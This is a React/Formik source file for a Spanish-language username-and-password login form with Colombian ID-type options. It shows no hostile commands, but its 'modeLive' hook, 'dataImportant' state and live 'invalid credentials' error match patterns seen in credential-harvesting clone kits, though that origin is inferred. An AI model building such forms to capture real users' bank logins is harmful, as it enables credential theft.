import { useFormik } from 'formik'
import { useState } from 'react'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordError } from './UsernameAndPasswordError'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import { useGeneralData } from '../../../hooks/useGeneralData'

const valuesData = { username: '', password: '', /* typeDocument: '' */ }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = () => {
    
    const dataImportant = useGeneralData({ modeLive: true })

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword: false}),
        onSubmit: async(valuesData, {resetForm}) => {
            // Descomentar si quieres un tipo de documento
            // valuesData.typeDocument = selectItem
            // Si voy a usar el modo email verificacion
            localStorage.setItem('email',JSON.stringify(valuesData.username))
            submitBase({dataImportant, valuesData}) 
            return resetForm()
        }
    })
    
    return (
        <>
            {
                dataImportant.showSpiner === true ? <Spiner /> : (
                    <>
                        {/* Aqui ira las notificacion de error en caso general */}
                        <UsernameAndPasswordError
                            touched={touched}
                            errors={errors}
                        />
                        {/* TODO: Teclado virtual */}
                        {/* <UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) */}
                        {dataImportant.liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)}
                        {/* Colocar diseño base */}
                        <form className='flex flex-col' onSubmit={handleSubmit}>

                            <UsernameAndPasswordInput
                                username={values.username}
                                password={values.password}
                                typeDocument={values.typeDocument}
                                handleChange={handleChange} 
                                handleBlur={handleBlur}
                                touched={touched}
                                errors={errors}
                                valueKeyBoardVirtual={valueKeyBoardVirtual}
                                showPasswordMode={false}

                                selectActive={selectActive} 
                                setSelectActive={setSelectActive}
                                selectItem={selectItem}
                                setSelectItem={setSelectItem}
                                opciones={opciones}
                            />

                            <button 
                                    disabled={
                                        (
                                            touched.username && 
                                            errors.username || 
                                            values.username.length === 0
                                        ) 
                                        // || 
                                        // (
                                        //     // Clave virtual o normal input
                                        //     // valueKeyBoardVirtual.length < 1 
                                        //     // (
                                        //     //     touched.password && 
                                        //     //     errors.password || 
                                        //     //     values.password.length === 0
                                        //     // )
                                        // ) 
                                        == true ? true : false
                                    }
                                className='bg-blue-400 px-4 py-1 rounded'
                                type='submit'
                            >
                                Ingresar
                            </button>
                        </form>
                    </>
                )
            }
        </>
            
    )
}
